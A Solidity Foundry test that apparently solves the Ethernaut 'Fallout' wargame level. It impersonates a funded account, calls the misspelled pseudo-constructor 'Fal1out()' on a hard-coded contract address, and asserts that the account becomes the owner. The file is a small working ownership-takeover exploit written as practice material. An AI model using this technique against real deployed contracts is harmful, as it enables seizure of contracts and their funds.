// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

contract Level2Test is Test {
    address fallout = 0xF8ea935607246Ad605a08A7c00Acbd39B2Bf8DC3;

    function setUp() public {}

    function test_GetOwner() public {
        address alice = vm.addr(1);
        console.log(alice, "alice");
        vm.deal(alice, 20 ether);
        vm.startPrank(alice);
        console.log(fallout.balance, "fb");
        (bool b,) = fallout.call(abi.encodeWithSignature("Fal1out()"));
        assertEq(b, true);
        (bool c, bytes memory returnData) = fallout.call(abi.encodeWithSignature("owner()"));
        assertEq(c, true);
        address d = abi.decode(returnData, (address));
        console.log(d);
        assertEq(d, alice);
    }
}
